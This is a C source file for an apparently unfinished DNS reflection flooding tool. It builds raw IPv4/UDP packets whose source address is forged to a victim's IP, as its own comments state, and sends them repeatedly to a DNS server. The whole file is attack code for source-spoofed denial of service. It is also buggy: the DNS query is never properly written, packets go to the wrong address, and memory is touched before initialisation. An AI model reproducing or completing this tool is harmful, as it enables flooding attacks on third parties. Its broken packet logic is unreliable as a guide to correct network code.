#include<unistd.h>
#include<arpa/inet.h>
#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<netinet/ip.h>
#include<netinet/udp.h>
#include<string.h>
#define PCKT_LEN 8192

struct ipheader
{
	unsigned char iph_ihl:5, iph_ver:4;
	unsigned char iph_tos;
	unsigned short int iph_len, iph_ident;
	unsigned char iph_flag;
	unsigned short int iph_offset;
	unsigned char iph_ttl;
	unsigned char iph_protocol;
	unsigned short int iph_chksum;
	unsigned int iph_sourceip;
	unsigned int iph_destip;
};
struct udpheader
{
	unsigned short int udph_srcport;
	unsigned short int udph_destport;
	unsigned short int udph_len;
	unsigned short int udph_chksum;
};
struct dnsheader{
	unsigned short id;
	unsigned char rd :1; //for recursion
	unsigned char tc:1;//truncated message
	unsigned char aa:1;//authoritative answer
	unsigned char opcode:4;//response code
	unsigned char qr:1;//query response flag
	unsigned char rcode:4;//response code
	unsigned char cd:1;//checking disabled
	unsigned char ad:1;//authenticated data
	unsigned char z:1;//its z! reserved
	unsigned char ra:1; //recursion availabe
	unsigned short q_count:1; //number of question entries
	unsigned short ans_count;//num of answer entries
	unsigned short auth_count;//number of authority entries
	unsigned short add_count;// number of resource entries

};
//question to be sent in DNS query
struct QUESTION {
	unsigned short qtype;
	unsigned short qclass;
};
struct QUERY{
	unsigned char *name;
	struct QUESTION *ques;
};
//resource data
struct R_DATA{
	unsigned short type;
	unsigned short _class;
	unsigned short ttl;
	unsigned short data_len;
};

unsigned short chksum(unsigned short *buf, int nwords){
	unsigned long sum;
	for(sum=0;nwords>0;nwords--){
		sum+=*buf++;
		sum=(sum>>16)+(sum&0xffff);
		sum+=(sum>>16);	
	}
	return (unsigned short)(~sum);
}
int main(int argc, char *argv[]){
	int sd;
	char buffer[PCKT_LEN], *qname;//we will use qname to point to beginning of DNS question area

	//creating the packet headers
	struct ipheader *ip = (struct ipheader*) buffer;
	struct udpheader *udp = (struct udpheader*) (buffer +sizeof(struct ipheader));
	struct sockaddr_in sin, din;
	struct QUESTION *qinfo =NULL;//part of our query for the DNS message
	struct QUERY *q=(struct QUERY*)(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+1);
	q->name="Hello World!";

	int one =1;
	const int *val=&one;

	memset(buffer,0,PCKT_LEN);
	if(argc!=5){
		printf("-Entered invalid parameters\n");
		printf("-Enter: %s <source hostname/IP> <source port> <target hostname/IP> <target port>\n", argv[0]);
		exit(-1);
	}
	//asigning the dns query to be put after the ip and udp header
	qname=(char* )&buffer[sizeof(struct ipheader)+sizeof(struct udpheader)];
	qinfo=(struct QUESTION*)&buffer[sizeof(struct ipheader)+sizeof(struct udpheader)+(strlen((const char*)qname)+1)+sizeof(struct QUERY)];
	/*need to figure out what the type of the command is */
	//qinfo->qtype=htons(AAAA);
	qinfo->qclass=htons(1);
	sd = socket(AF_INET,SOCK_RAW, IPPROTO_UDP);
	if(sd<0){
		perror("socket() error");
		exit(-1);
	}else{
		printf("socket() -Using SOCK_RAW socket and UDP protocol is OK.\n");	
	}

		//address family for both sockets
		sin.sin_family = AF_INET;
		din.sin_family = AF_INET;
		
		//port numbers
		sin.sin_port=htons(atoi(argv[2]));
		din.sin_port=htons(atoi(argv[4]));
		//IP addresses
		sin.sin_addr.s_addr = inet_addr(argv[1]);

		din.sin_addr.s_addr = inet_addr(argv[3]);
		//Assigning vales to IP header
		ip->iph_ihl=5;
		ip->iph_ver=4;
		ip->iph_tos=16;//for low delay
		ip->iph_len = sizeof(struct ipheader)+ sizeof(struct udpheader);//+sizeof(struct QUESTION);//+sizeof(struct dnsheader);
		ip->iph_ident = htons(54321);
		ip->iph_ttl=64;//number of hops
		ip->iph_protocol=17;//Because we are using UDP
		ip->iph_sourceip=inet_addr(argv[1]);//Here is where we use spoofed IP address from victim
		ip->iph_destip = inet_addr(argv[3]);//address of DNS server in this case
		//Assigning values to UDP header
		udp->udph_srcport= htons(atoi(argv[2]));//src port number
		udp->udph_destport = htons(atoi(argv[4]));
		udp->udph_len = htons(sizeof(struct udpheader));
		//do the ckecksum to scan for errors when packet is sent
		ip->iph_chksum = chksum((unsigned short *) buffer, sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct QUERY));
		if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0){
			perror("setsockt() error]\n");
			exit(-1);
		}
		else{
			printf("setsockopt() is OK.\n");
		}
		//looping to send the packets to desination
		printf("Attempting to send the packets...\n");
		printf("Using raw socket and UDP protocol]n");
		printf("Using Source IP: %s, port %u, Target IP: %s, port %u,\n", argv[1], atoi(argv[2]), argv[3], atoi(argv[4]));
		int count=1;
		for(count; count < 100; count++){
			if(sendto(sd, (char*)buffer, ip->iph_len+sizeof(struct QUESTION)+(strlen((const char*)qname)+1), 0, (struct sockaddr* )&sin, sizeof(sin)) <0){
				perror("sendto() error");	
				exit(-1);
			}	
			else{
				printf("Count #%d -sendto() is OK.\n",count);	
			}
			sleep(1);
		}
		close(sd);
	return 0;
}
